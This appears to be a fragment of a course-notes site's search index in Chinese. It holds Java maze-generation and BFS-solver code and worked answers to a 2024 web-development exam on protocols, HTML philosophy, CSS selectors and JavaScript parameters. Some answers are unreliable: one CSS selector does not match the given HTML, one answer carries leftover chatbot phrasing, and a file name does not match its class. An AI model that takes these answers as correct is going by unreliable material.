<p><code>maze/MazeBoundsException.java</code></p> <pre><code>package maze;\n\npublic class MazeBoundsException extends Exception {\n\n    public MazeBoundsException() {\n        super();\n    }\n\n    public MazeBoundsException(String message) {\n        super(message);\n    }\n}\n</code></pre> <ul> <li> <ol> <li>\u751f\u6210\u968f\u673a\u5899\uff0c\u663e\u793a\u8ff7\u5bab\u548c\u89e3\u51b3\u65b9\u6848</li> </ol> </li> </ul> <p><code>RandomMaze.java</code></p> <pre><code>package maze;\n\nimport java.util.Random; // \u5bfc\u5165 Random \u7c7b\n\n/**\n * \u521b\u5efa\u5177\u6709\u968f\u673a\u5899\u58c1\u7684\u8ff7\u5bab\u3002\n */\npublic class RandomMaze extends Maze {\n\n    /**\n     * \u6784\u9020\u51fd\u6570\u3002\n     * @param rows \u884c\u6570 (&gt;0)\u3002\n     * @param cols \u5217\u6570 (&gt;0)\u3002\n     * @param wallProbability \u5899\u58c1\u6982\u7387 ([0.0, 1.0])\u3002\n     */\n    public RandomMaze(int rows, int cols, double wallProbability) {\n        // \u8c03\u7528\u7236\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316\u7f51\u683c\n        super(rows, cols);\n\n        if (wallProbability &lt; 0.0 || wallProbability &gt; 1.0) {\n            throw new IllegalArgumentException(\"\u5899\u58c1\u6982\u7387\u5fc5\u987b\u5728 0.0 \u5230 1.0 \u4e4b\u95f4\");\n        }\n\n        Random rand = new Random(); // \u521b\u5efa Random \u5b9e\u4f8b\n\n        for (int r = 0; r &lt; rows; r++) {\n            for (int c = 0; c &lt; cols; c++) {\n                // \u4f7f\u7528 rand.nextDouble() \u66ff\u4ee3 Math.random()\n                if (rand.nextDouble() &lt; wallProbability) {\n                    try {\n                        // \u8bbe\u7f6e\u5899\u58c1\uff0c\u5904\u7406\u5fc5\u9700\u7684\u5f02\u5e38\n                        setWall(r, c);\n                    } catch (MazeBoundsException e) {\n                        // \u7406\u8bba\u4e0a\u4e0d\u5e94\u53d1\u751f\n                        System.err.println(\"\u5185\u90e8\u9519\u8bef: setWall \u5931\u8d25\u4e8e (\" + r + \",\" + c + \")\");\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> <p><code>MathSolver.java</code></p> <pre><code>import maze.*;\nimport java.util.ArrayDeque;\nimport java.util.Queue;\n\n// \u5b58\u50a8\u8ff7\u5bab\u4f4d\u7f6e\nclass MazeLocation {\n    public int row, col;\n    public MazeLocation(int row, int col) {\n        this.row = row;\n        this.col = col;\n    }\n}\n\npublic class MazeSolver {\n\n    public static void main(String[] args) {\n        int rows = 10, cols = 10;\n        double probability = 0.2;\n\n        // \u521b\u5efa\u968f\u673a\u8ff7\u5bab\n        Maze maze = new RandomMaze(rows, cols, probability);\n        System.out.println(\"\u8ff7\u5bab (\" + rows + \"x\" + cols + \", P(\u5899)=\" + probability + \"):\");\n        System.out.println(\"('#'=\u5899, ' '=\u7a7a, 'x'=\u8def\u5f84)\");\n\n        // \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22 (BFS) \u6c42\u89e3\n        MazeLocation[][] parent = new MazeLocation[rows][cols]; // \u5b58\u50a8\u8def\u5f84\u524d\u9a71\n        boolean found = false;\n\n        parent[0][0] = new MazeLocation(-1, -1); // \u6807\u8bb0\u8d77\u70b9\n        Queue&lt;MazeLocation&gt; queue = new ArrayDeque&lt;&gt;();\n        queue.add(new MazeLocation(0, 0));\n\n        int[][] dirs = {{1, 0}, {0, 1}, {-1, 0}, {0, -1}}; // \u56db\u4e2a\u65b9\u5411\n\n        try {\n            while (!queue.isEmpty() &amp;&amp; !found) {\n                MazeLocation loc = queue.remove();\n\n                if (loc.row == rows - 1 &amp;&amp; loc.col == cols - 1) { // \u5230\u8fbe\u7ec8\u70b9\n                    found = true;\n                    break;\n                }\n\n                // \u63a2\u7d22\u90bb\u5c45\n                for (int[] dir : dirs) {\n                    int nextRow = loc.row + dir[0];\n                    int nextCol = loc.col + dir[1];\n\n                    // \u68c0\u67e5\u6709\u6548\u6027\uff1a\u8fb9\u754c\u5185\u3001\u975e\u5899\u3001\u672a\u8bbf\u95ee\n                    if (nextRow &gt;= 0 &amp;&amp; nextRow &lt; rows &amp;&amp; nextCol &gt;= 0 &amp;&amp; nextCol &lt; cols\n                            &amp;&amp; !maze.isWall(nextRow, nextCol)\n                            &amp;&amp; parent[nextRow][nextCol] == null)\n                    {\n                        parent[nextRow][nextCol] = loc; // \u8bb0\u5f55\u524d\u9a71\n                        queue.add(new MazeLocation(nextRow, nextCol)); // \u52a0\u5165\u961f\u5217\n                    }\n                }\n            }\n\n            // \u6253\u5370\u7ed3\u679c\n            boolean[][] path = new boolean[rows][cols];\n\n            if (!found) {\n                System.out.println(\"\\n\u65e0\u89e3\uff01\");\n                // \u4ec5\u6253\u5370\u8ff7\u5bab\u672c\u8eab\n                 for (int r = 0; r &lt; rows; r++) {\n                    for (int c = 0; c &lt; cols; c++) {\n                       if (maze.isWall(r, c)) System.out.print(\"#\");\n                       else System.out.print(\" \");\n                    }\n                    System.out.println();\n                }\n            } else {\n                System.out.println(\"\\n\u627e\u5230\u8def\u5f84\uff01\");\n                // \u56de\u6eaf\u6807\u8bb0\u8def\u5f84\n                MazeLocation curr = new MazeLocation(rows - 1, cols - 1);\n                while (curr.row != -1) { // \u56de\u6eaf\u5230\u8d77\u70b9\u6807\u8bb0\n                    path[curr.row][curr.col] = true;\n                    curr = parent[curr.row][curr.col];\n                }\n\n                // \u6253\u5370\u5e26\u8def\u5f84\u7684\u8ff7\u5bab\n                for (int r = 0; r &lt; rows; r++) {\n                    for (int c = 0; c &lt; cols; c++) {\n                        if (path[r][c]) System.out.print(\"x\");\n                        else if (maze.isWall(r, c)) System.out.print(\"#\");\n                        else System.out.print(\" \");\n                    }\n                    System.out.println();\n                }\n            }\n\n        } catch (MazeBoundsException e) {\n            // \u5904\u7406 isWall \u5f02\u5e38 (\u7406\u8bba\u4e0a\u5e94\u907f\u514d)\n            System.err.println(\"\u8ff7\u5bab\u8fb9\u754c\u9519\u8bef: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>"},{"location":"cs/mern/3403/2024/","title":"2024 Exam","text":""},{"location":"cs/mern/3403/2024/#q1","title":"Q1","text":"<p>a. \u5728\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\uff0c\u534f\u8bae\u662f\u4ec0\u4e48\u610f\u601d\uff1f</p> <p>\u5728\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\uff0c\u7279\u522b\u662f\u5728\u7f51\u7edc\u901a\u4fe1\u9886\u57df\uff0c\u534f\u8bae\u662f\u6307\u8ba1\u7b97\u673a\u548c\u7f51\u7edc\u8bbe\u5907\u4e4b\u95f4\u7528\u4e8e\u901a\u4fe1\u548c\u89e3\u91ca\u6570\u636e\u6d41\u7684\u4e00\u5957\u5171\u540c\u8bed\u8a00\u6216\u89c4\u5219\u3002\u7f51\u7edc\u901a\u4fe1\u4e4b\u6240\u4ee5\u6210\u4e3a\u53ef\u80fd\uff0c\u6b63\u662f\u56e0\u4e3a\u8ba1\u7b97\u673a\u201c\u8bb2\u201d\u540c\u4e00\u79cd\u8bed\u8a00\uff0c\u5e76\u4e14\u77e5\u9053\u5982\u4f55\u89e3\u91ca\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff08\u59820\u548c1\u5e8f\u5217\uff09\u3002\u8fd9\u4e9b\u9884\u5b9a\u4e49\u7684\u534f\u8bae\u544a\u8bc9\u8ba1\u7b97\u673a\u5982\u4f55\u89e3\u91ca\u8fd9\u4e9b\u6570\u636e\u6d41\u3002\u4e92\u8054\u7f51\u7684\u6838\u5fc3\u662f TCP/IP \u6a21\u578b\uff0c\u8fd9\u662f\u4e00\u7ec4\u534f\u8bae\uff0c\u65e0\u8bba\u4f55\u79cd\u7c7b\u578b\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u8fde\u63a5\u5230\u4e92\u8054\u7f51\uff0c\u53ea\u8981\u4f7f\u7528 TCP/IP\uff0c\u5c31\u53ef\u4ee5\u4e0e\u5176\u4ed6\u7c7b\u578b\u7684\u8ba1\u7b97\u673a\u4ea4\u6362\u6570\u636e\u3002</p> <p>b. \u7ed9\u51fa\u4e07\u7ef4\u7f51\u4e2d\u4f7f\u7528\u7684 2 \u4e2a\u534f\u8bae\u793a\u4f8b\u5e76\u89e3\u91ca\u5176\u7528\u9014\u3002</p> <p>\u4e07\u7ef4\u7f51\u6784\u5efa\u5728\u4e92\u8054\u7f51\u4e4b\u4e0a\u3002\u4ee5\u4e0b\u662f\u4e07\u7ef4\u7f51\u4e2d\u4f7f\u7528\u7684\u4e24\u4e2a\u534f\u8bae\u793a\u4f8b\u53ca\u5176\u7528\u9014\uff1a</p> <ul> <li>HTTP (\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae)\uff1aHTTP \u662f\u4e07\u7ef4\u7f51\u4e2d\u5ba2\u6237\u7aef\uff08\u4f8b\u5982\u7f51\u7edc\u6d4f\u89c8\u5668\uff09\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7ea6\u5b9a\u4f7f\u7528\u7684\u534f\u8bae\u3002\u7528\u6237\u901a\u8fc7\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u7f51\u9875\u3002\u6d4f\u89c8\u5668\u4f5c\u4e3a\u5ba2\u6237\u7aef\uff0c\u627e\u5230\u6b63\u786e\u7684\u670d\u52a1\u5668\u5e76\u901a\u8fc7 HTTP \u534f\u8bae\u53d1\u9001\u8bf7\u6c42\u3002\u670d\u52a1\u5668\u6839\u636e\u8bf7\u6c42\uff0c\u4ece\u5176\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff08\u6216\u52a8\u6001\u751f\u6210\uff09\u68c0\u7d22\u7f51\u9875\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7 HTTP \u5c06\u6587\u4ef6\u4f20\u8f93\u56de\u6d4f\u89c8\u5668\u3002HTTP \u662f\u4e07\u7ef4\u7f51\u5e94\u7528\u5c42\u5e38\u7528\u7684\u534f\u8bae\u3002</li> <li>TCP (\u4f20\u8f93\u63a7\u5236\u534f\u8bae)\uff1aTCP \u662f TCP/IP \u6a21\u578b\u7684\u4e00\u90e8\u5206\uff0c\u5c5e\u4e8e\u4f20\u8f93\u5c42\u534f\u8bae\u3002\u5176\u4e3b\u8981\u7528\u9014\u662f\u4fdd\u8bc1\u6570\u636e\u7684\u53ef\u9760\u4f20\u8f93\u3002\u5728\u4e0d\u53ef\u9760\u7684\u7269\u7406\u7f51\u7edc\u5c42\u4e4b\u4e0a\uff08\u4f8b\u5982\u7535\u7ebf\u3001Wi-Fi \u6216\u536b\u661f\u94fe\u8def\uff09\uff0cTCP \u5c06\u6570\u636e\u6d41\u5206\u6210\u591a\u4e2a\u6570\u636e\u5305\uff0c\u5e76\u901a\u8fc7\u7f51\u7edc\u5355\u72ec\u53d1\u9001\u3002\u5b83\u8d1f\u8d23\u68c0\u6d4b\u548c\u4fee\u590d\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e22\u5931\u6216\u635f\u574f\u7684\u6570\u636e\u5305\uff0c\u4f7f\u7528\u6821\u9a8c\u548c\u3001\u7b7e\u540d\u548c\u786e\u8ba4\u7b49\u673a\u5236\uff0c\u786e\u4fdd\u6574\u4e2a\u6d88\u606f\u6700\u7ec8\u4ee5\u6b63\u786e\u7684\u987a\u5e8f\u5b8c\u6574\u5730\u5230\u8fbe\u76ee\u7684\u5730\u3002\u5bf9\u4e8e\u9700\u8981\u4fdd\u8bc1\u4f20\u8f93\u7684\u901a\u4fe1\uff0c\u4f7f\u7528 TCP/IP \u800c\u4e0d\u662f UDP\uff08\u7528\u6237\u6570\u636e\u62a5\u534f\u8bae\uff09\u3002</li> </ul> <p>c. \u534f\u8bae\u4e0d\u9650\u4e8e\u8ba1\u7b97\u673a\u79d1\u5b66\u3002\u4e3e\u4e00\u4e2a\u5f00\u8f66\u65f6\u4f7f\u7528\u7684\u534f\u8bae\u793a\u4f8b\u3002</p> <p>\u5173\u4e8e\u5f00\u8f66\u65f6\u4f7f\u7528\u7684\u534f\u8bae\u7684\u4fe1\u606f\u4e0d\u5728\u60a8\u63d0\u4f9b\u7684\u6765\u6e90\u6216\u6211\u4eec\u7684\u5bf9\u8bdd\u5386\u53f2\u4e2d\u3002</p> <p>\u7136\u800c\uff0c\u4e3e\u4e00\u4e2a\u6765\u81ea\u4e00\u822c\u77e5\u8bc6\u7684\u5f00\u8f66\u65f6\u4f7f\u7528\u7684\u534f\u8bae\u793a\u4f8b\u662f\uff1a\u4ea4\u901a\u4fe1\u53f7\u706f\u3002\u5728\u7ea2\u706f\u4eae\u8d77\u65f6\u505c\u8f66\u5c31\u662f\u4e00\u79cd\u534f\u8bae\u3002\u6240\u6709\u9a7e\u9a76\u5458\u90fd\u7406\u89e3\u5e76\u9075\u5b88\u8fd9\u4e00\u89c4\u5219\uff08\u534f\u8bae\uff09\uff0c\u4ee5\u786e\u4fdd\u4ea4\u901a\u5b89\u5168\u548c\u6709\u5e8f\u6d41\u52a8\u3002</p>"},{"location":"cs/mern/3403/2024/#q2","title":"Q2","text":"<p>The five parts of the HTML philosophy are: \u2022 Interoperability \u2022 Graceful error recovery \u2022 Backwards compatibility \u2022 Prioritising users \u2022 Separation of concerns.</p> <p>a. \u89e3\u91ca\u201c\u4e92\u64cd\u4f5c\u6027\u201d\uff08Interoperability\uff09\u7684\u542b\u4e49\u3002 \u201c\u4e92\u64cd\u4f5c\u6027\u201d\u610f\u5473\u7740HTML\u5e94\u8be5\u80fd\u591f\u5728\u5404\u79cd\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u4e0a\u6b63\u786e\u5730\u5448\u73b0\u3002</p> <p>b. \u89e3\u91ca\u201c\u4f18\u96c5\u7684\u9519\u8bef\u6062\u590d\u201d\uff08Graceful error recovery\uff09\u7684\u542b\u4e49\u5e76\u63d0\u4f9b\u4e00\u4e2a\u4f8b\u5b50\u3002 \u201c\u4f18\u96c5\u7684\u9519\u8bef\u6062\u590d\u201d\u610f\u5473\u7740\u5373\u4f7f\u5b58\u5728\u4e00\u4e9b\u5c0f\u9519\u8bef\uff0c\u4e5f\u4e0d\u5e94\u8be5\u963b\u6b62\u9875\u9762\u6b63\u5e38\u6e32\u67d3\u3002 \u6839\u636e\u6765\u6e90\uff0c\u4e3a\u4e86\u5b9e\u73b0\u4f18\u96c5\u7684\u9519\u8bef\u6062\u590d\uff0c\u7f51\u9875\u6d4f\u89c8\u5668\u6e32\u67d3\u5668\u975e\u5e38\u5bbd\u677e\u3002\u6d4f\u89c8\u5668\u4f1a\u5ffd\u7565\u4e00\u4e9b\u5185\u5bb9\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u672a\u8bc6\u522b\u7684\u6807\u7b7e\u3002</li> <li>\u6362\u884c\u7b26\u3002</li> <li>\u5236\u8868\u7b26\u548c\u591a\u4e2a\u7a7a\u683c\u3002</li> <li>\u5373\u4f7f\u662f\u5173\u952e\u6587\u6863\u6807\u7b7e\u5982 <code>&lt;html&gt;</code>, <code>&lt;head&gt;</code>, \u751a\u81f3 <code>&lt;body&gt;</code> \u4e5f\u6ca1\u6709\u5fc5\u8981\u5b58\u5728\u3002</li> <li>\u5373\u4f7f\u6ca1\u6709\u5339\u914d\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u6807\u7b7e\uff08\u5c3d\u7ba1\u5f3a\u70c8\u5efa\u8bae\u5339\u914d\uff0c\u56e0\u4e3a\u8fd9\u662f\u5e38\u89c1\u7684\u9519\u8bef\u6765\u6e90\uff09\u3002</li> <li>\u6807\u7b7e\u4ec5\u4ec5\u662f\u5bf9\u6d4f\u89c8\u5668\u7684\u5efa\u8bae\uff0c\u5373\u4f7f\u88ab\u6d4f\u89c8\u5668\u8bc6\u522b\uff0c\u4e5f\u53ef\u80fd\u88ab\u5ffd\u7565\u3002 \u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c\u5982\u679c\u60a8\u5728HTML\u6587\u6863\u4e2d\u4f7f\u7528\u4e86\u6d4f\u89c8\u5668\u65e0\u6cd5\u8bc6\u522b\u7684\u81ea\u5b9a\u4e49\u6807\u7b7e\uff0c\u6216\u8005\u5fd8\u8bb0\u4e86\u5173\u95ed\u67d0\u4e9b\u6807\u7b7e\uff0c\u6d4f\u89c8\u5668\u901a\u5e38\u4e0d\u4f1a\u56e0\u6b64\u505c\u6b62\u6e32\u67d3\u6574\u4e2a\u9875\u9762\uff0c\u800c\u662f\u5c1d\u8bd5\u5ffd\u7565\u8fd9\u4e9b\u9519\u8bef\u5e76\u7ee7\u7eed\u663e\u793a\u9875\u9762\u7684\u5176\u4f59\u90e8\u5206\u3002</li> </ul> <p>c. \u7ed3\u5408\u4e0a\u8ff0HTML\u54f2\u5b66\uff0c\u89e3\u91ca\u4e3a\u4ec0\u4e48<code>&lt;b&gt;</code>\u6807\u7b7e\u7684\u5b9a\u4e49\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4ee5\u53ca\u4e3a\u4ec0\u4e48<code>&lt;b&gt;</code>\u6807\u7b7e\u6ca1\u6709\u88ab\u79fb\u9664\u5e76\u66ff\u6362\u6210\u4f8b\u5982<code>&lt;important&gt;</code>\u6807\u7b7e\u3002 <code>&lt;b&gt;</code>\u6807\u7b7e\u6700\u521d\u5728\u539f\u59cbHTML\u89c4\u8303\u4e2d\u7528\u4e8e\u201c\u6807\u8bb0\u5e94\u4f7f\u7528\u7c97\u4f53\u5b57\u4f53\u663e\u793a\u7684\u6587\u672c\u201d [\u90e8\u5206\u5728\u95ee\u9898\u4e2d\u63d0\u4f9b]\u3002\u8fd9\u4e3b\u8981\u662f\u5173\u4e8e\u6587\u672c\u7684\u5916\u89c2\u6216\u6837\u5f0f\u3002 \u5728HTML4\u4e2d\uff0c\u5176\u5b9a\u4e49\u88ab\u66f4\u6539\u4e3a\u201c\u5f15\u8d77\u8bfb\u8005\u7684\u6ce8\u610f\uff0c\u5176\u5185\u5bb9\u5e76\u672a\u88ab\u8d4b\u4e88\u7279\u522b\u91cd\u8981\u6027\u201d [\u90e8\u5206\u5728\u95ee\u9898\u4e2d\u63d0\u4f9b]\u3002\u8fd9\u66f4\u591a\u5730\u662f\u5173\u4e8e\u6587\u672c\u7684\u8bed\u4e49\u6216\u610f\u4e49\u3002</p> <p>\u8fd9\u79cd\u5b9a\u4e49\u7684\u53d8\u5316\u4e0eHTML5\u54f2\u5b66\u4e2d\u7684\u201c\u5173\u6ce8\u70b9\u5206\u79bb\u201d\u539f\u5219\u76f4\u63a5\u76f8\u5173\u3002\u8be5\u539f\u5219\u5f3a\u8c03\u201c\u63cf\u8ff0\u4fe1\u606f\u7684\u7c7b\u578b\uff0c\u800c\u4e0d\u662f\u5b83\u5982\u4f55\u663e\u793a\u201d\u3002\u539f\u59cb\u7684<code>&lt;b&gt;</code>\u5b9a\u4e49\u4fa7\u91cd\u4e8e\u663e\u793a\uff08\u7c97\u4f53\uff09\uff0c\u800c\u65b0\u7684\u5b9a\u4e49\u4fa7\u91cd\u4e8e\u8bed\u4e49\uff08\u5f15\u8d77\u6ce8\u610f\uff09\u3002\u8fd9\u79cd\u6539\u53d8\u4f7f\u5f97HTML\u66f4\u52a0\u4e13\u6ce8\u4e8e\u63cf\u8ff0\u5185\u5bb9\u7684\u7ed3\u6784\u548c\u7c7b\u578b\uff0c\u800c\u5c06\u5916\u89c2\u548c\u6837\u5f0f\u7684\u5de5\u4f5c\u7559\u7ed9CSS\uff08\u5c42\u53e0\u6837\u5f0f\u8868\uff09\u3002</p> <p>\u5173\u4e8e\u4e3a\u4ec0\u4e48<code>&lt;b&gt;</code>\u6807\u7b7e\u6ca1\u6709\u88ab\u5b8c\u5168\u79fb\u9664\u5e76\u66ff\u6362\u6210\u5982<code>&lt;important&gt;</code>\u8fd9\u6837\u7684\u65b0\u6807\u7b7e\uff0c\u8fd9\u4e0eHTML5\u54f2\u5b66\u4e2d\u7684\u201c\u5411\u540e\u517c\u5bb9\u201d\u539f\u5219\u6709\u5173\u3002\u8be5\u539f\u5219\u6307\u51fa\u201c\u65b0\u529f\u80fd\u4e0d\u5e94\u8be5\u7834\u574f\u73b0\u6709\u7f51\u7edc\u201d\u3002<code>&lt;b&gt;</code>\u6807\u7b7e\u5728\u65e7\u7684\u7f51\u9875\u4e2d\u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002\u5982\u679c\u5c06\u5176\u5b8c\u5168\u79fb\u9664\uff0c\u5c06\u5bfc\u81f4\u5927\u91cf\u73b0\u6709\u7f51\u9875\u5728\u6e32\u67d3\u65f6\u51fa\u73b0\u95ee\u9898\uff0c\u4ece\u800c\u7834\u574f\u4e86\u7f51\u7edc\u7684\u7a33\u5b9a\u6027\u548c\u7528\u6237\u4f53\u9a8c\u3002</p> <p>\u6b64\u5916\uff0c\u201c\u4f18\u5148\u8003\u8651\u7528\u6237\u201d\u7684\u54f2\u5b66\uff08\u7528\u6237&gt;\u7f51\u9875\u8bbe\u8ba1\u5e08&gt;\u6d4f\u89c8\u5668\u5b9e\u73b0\u8005&gt;\u7406\u8bba\u5bb6\uff09\u4e5f\u53ef\u80fd\u5728\u51b3\u5b9a\u4fdd\u7559<code>&lt;b&gt;</code>\u6807\u7b7e\uff08\u5c3d\u7ba1\u91cd\u65b0\u5b9a\u4e49\u4e86\u5176\u8bed\u4e49\uff09\u4e2d\u53d1\u6325\u4e86\u4f5c\u7528\u3002\u79fb\u9664\u4e00\u4e2a\u5e7f\u6cdb\u4f7f\u7528\u7684\u6807\u7b7e\u4f1a\u7ed9\u7f51\u9875\u8bbe\u8ba1\u5e08\u5e26\u6765\u8d1f\u62c5\uff0c\u9700\u8981\u66f4\u65b0\u73b0\u6709\u5185\u5bb9\uff1b\u540c\u65f6\uff0c\u5982\u679c\u65e7\u5185\u5bb9\u56e0\u6b64\u65e0\u6cd5\u6b63\u5e38\u663e\u793a\uff0c\u4e5f\u4f1a\u5f71\u54cd\u7528\u6237\u3002</p> <p>\u56e0\u6b64\uff0c\u66f4\u6539<code>&lt;b&gt;</code>\u6807\u7b7e\u7684\u5b9a\u4e49\u662f\u51fa\u4e8e\u5c06\u5916\u89c2\u4e0e\u8bed\u4e49\u5206\u79bb\u7684\u54f2\u5b66\u8003\u91cf\uff0c\u4f7f\u5176\u66f4\u7b26\u5408\u63cf\u8ff0\u5185\u5bb9\u7c7b\u578b\u7684\u76ee\u6807\u3002\u800c\u6ca1\u6709\u79fb\u9664\u5b83\uff0c\u5219\u662f\u4e3a\u4e86\u4fdd\u6301\u5411\u540e\u517c\u5bb9\uff0c\u907f\u514d\u7834\u574f\u73b0\u6709\u7f51\u7edc\uff0c\u5e76\u4f18\u5148\u8003\u8651\u7528\u6237\u548c\u7f51\u9875\u8bbe\u8ba1\u5e08\u7684\u4f53\u9a8c\u3002</p>"},{"location":"cs/mern/3403/2024/#q3","title":"Q3","text":"<pre><code>&lt;body&gt;\n  &lt;div id=\"q1\"&gt;\n    &lt;!-- ... other elements ... --&gt;\n    &lt;div&gt;\n      &lt;!-- ... other elements ... --&gt;\n      &lt;p id=\"warning\"&gt; (If you're sure you got it right!) &lt;/p&gt;\n      &lt;button id=\"saveButton\" class=\"myButton\" autofocus&gt; Save &lt;/button&gt;\n      &lt;button id=\"loadButton\" class=\"myButton\" autofocus&gt; Load &lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/body&gt;\n</code></pre> <p>a. \u6211\u4eec\u5c06\u627e\u5230\u5b9a\u4f4d  Save  \u5143\u7d20\u7684\u516d\u79cd\u4e0d\u540c\u7684 CSS \u9009\u62e9\u5668\u8868\u8fbe\u5f0f\uff0c\u5e76\u5c06\u5176\u80cc\u666f\u989c\u8272\u8bbe\u7f6e\u4e3a\u7ea2\u8272\u3002</p> <ul> <li>element selector</li> </ul> <pre><code>button { background-color: red; }  \n</code></pre> <ul> <li>attribute selector</li> </ul> <pre><code>[autofocus] { background-color: red; }\n</code></pre> <p>\u200b   Save \u4ee5\u53ca Load \u6309\u94ae\u90fd\u5177\u5907 <code>autofocus</code> \u5c5e\u6027\u90fd\u4f1a\u88ab\u5339\u914d</p> <ul> <li>ID selector</li> </ul> <pre><code>#saveButton { background-color: red; }  \n</code></pre> <ul> <li>Two element selectors and a direct descendent selector. </li> </ul> <pre><code>div &gt; div &gt; button { background-color: red; } \n</code></pre> <ul> <li>A class selector, an attribute selector and a sibling selector.</li> </ul> <pre><code>p ~ .myButton[autofocus] { background-color: red; } \n</code></pre> <ul> <li>Three ID selectors, a direct sibling selector, a descendant selector </li> </ul> <pre><code>#q1 + #warning #saveButton { background-color: red; }\n</code></pre> <p>\u53ef\u4ee5\u662f\u7a7a\u683c\u4e5f\u53ef\u4ee5\u662f <code>&gt;</code> </p> <p>b. Explain two advantages of making your CSS selectors as specific as possible. </p> <p>\u786e\u4fdd\u6837\u5f0f\u88ab\u5e94\u7528\u5e76\u8986\u76d6\u4e0d\u592a\u5177\u4f53\u7684\u89c4\u5219\uff1a\u4f7f\u7528\u5177\u4f53\u6027\u9ad8\u7684\u9009\u62e9\u5668\uff08\u4f8b\u5982 ID \u9009\u62e9\u5668 <code>[#id]</code> \u7684\u7279\u5f02\u6027\u9ad8\u4e8e\u7c7b\u9009\u62e9\u5668 <code>[.class]</code> \u7684\u7279\u5f02\u6027\uff0c\u7c7b\u9009\u62e9\u5668\u9ad8\u4e8e\u5143\u7d20\u9009\u62e9\u5668 <code>[element]</code> \u7684\u7279\u5f02\u6027\uff09\u53ef\u4ee5\u63d0\u9ad8\u60a8\u89c4\u5219\u7684\u4f18\u5148\u7ea7\u3002\u8fd9\u610f\u5473\u7740\u5373\u4f7f\u540c\u4e00\u5143\u7d20\u53d7\u5230\u6765\u81ea\u7528\u6237\u4ee3\u7406\u6837\u5f0f\u8868\uff08\u6d4f\u89c8\u5668\u9ed8\u8ba4\u6837\u5f0f\uff09\u7528\u6237\u6837\u5f0f\u8868\u6216\u5176\u4ed6\u4f5c\u8005\u6837\u5f0f\u8868\u4e2d\u7279\u5f02\u6027\u8f83\u4f4e\u7684\u89c4\u5219\u7684\u5f71\u54cd\uff0c\u60a8\u7684\u5177\u4f53\u89c4\u5219\u4e5f\u4f1a\u56e0\u4e3a\u66f4\u9ad8\u7684\u7279\u5f02\u6027\u800c\u88ab\u4f18\u5148\u5e94\u7528\u3002\u8fd9\u5bf9\u4e8e\u5728\u590d\u6742\u7684\u7f51\u9875\u7ed3\u6784\u6216\u4f7f\u7528\u591a\u4e2a\u6837\u5f0f\u8868\u65f6\uff0c\u786e\u4fdd\u67d0\u4e2a\u5143\u7d20\u83b7\u5f97\u60a8\u6307\u5b9a\u7684\u7cbe\u786e\u6837\u5f0f\u81f3\u5173\u91cd\u8981\u3002</p> <p>\u9632\u6b62\u6837\u5f0f\u88ab\u610f\u5916\u8986\u76d6\uff1a\u5982\u679c\u60a8\u4f7f\u7528\u4e86\u7279\u5f02\u6027\u8f83\u4f4e\u7684\u9009\u62e9\u5668\uff0c\u90a3\u4e48\u5728\u5176\u4ed6\u5730\u65b9\uff08\u4f8b\u5982\uff0c\u5728\u6837\u5f0f\u8868\u7684\u540e\u9762\u6216\u4e0d\u540c\u7684\u6837\u5f0f\u6587\u4ef6\u4e2d\uff09\u6dfb\u52a0\u7684\u3001\u7279\u5f02\u6027\u66f4\u9ad8\u7684\u89c4\u5219\u53ef\u80fd\u4f1a\u610f\u5916\u5730\u8986\u76d6\u60a8\u7684\u6837\u5f0f\u3002\u901a\u8fc7\u4f7f\u60a8\u7684\u9009\u62e9\u5668\u5c3d\u53ef\u80fd\u5177\u4f53\uff0c\u60a8\u5c31\u589e\u52a0\u4e86\u8be5\u89c4\u5219\u7684\u7279\u5f02\u6027\u6743\u91cd\uff0c\u964d\u4f4e\u4e86\u5176\u88ab\u540e\u7eed\u6dfb\u52a0\u7684\u3001\u4f46\u7279\u5f02\u6027\u4e0d\u5982\u5b83\u7684\u89c4\u5219\u610f\u5916\u8986\u76d6\u7684\u98ce\u9669\u3002\u8fd9\u6709\u52a9\u4e8e\u63d0\u9ad8\u6837\u5f0f\u5b9a\u4e49\u7684\u7a33\u5b9a\u6027\uff0c\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u8c03\u8bd5\u5de5\u4f5c\u3002\u867d\u7136\u7279\u5f02\u6027\u8fc7\u9ad8\u4e5f\u53ef\u80fd\u5bfc\u81f4\u96be\u4ee5\u8986\u76d6\u7684\u95ee\u9898\uff08\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u66f4\u5177\u4f53\u7684\u9009\u62e9\u5668\u6216 <code>!important</code> \u6765\u8986\u76d6\uff09\uff0c\u4f46\u5728\u9700\u8981\u4fdd\u8bc1\u6837\u5f0f\u5e94\u7528\u65f6\uff0c\u201c\u5c3d\u53ef\u80fd\u5177\u4f53\u201d\u786e\u5b9e\u6709\u52a9\u4e8e\u9632\u6b62\u610f\u5916\u8986\u76d6\u3002</p>"},{"location":"cs/mern/3403/2024/#q4","title":"Q4","text":"<p>a. Explain the difference between \u201cformal parameters\u201d and \u201cactual parameters\u201d in JavaScript, including what values they take and when and how they may be accessed.</p> <pre><code>function example(firstName, lastName) { \n  // firstName \u548c lastName \u662f\u5f62\u5f0f\u53c2\u6570\n   console.log(firstName, lastName);\n}\n\nexample('John', 'Doe'); // 'John' \u548c 'Doe' \u662f\u5b9e\u9645\u53c2\u6570\n</code></pre> <p>b. \u8be6\u60c5\u76f4\u63a5\u770b l5_ex</p>"},{"location":"cs/mern/3403/2024/#q5","title":"Q5","text":"<p>a. 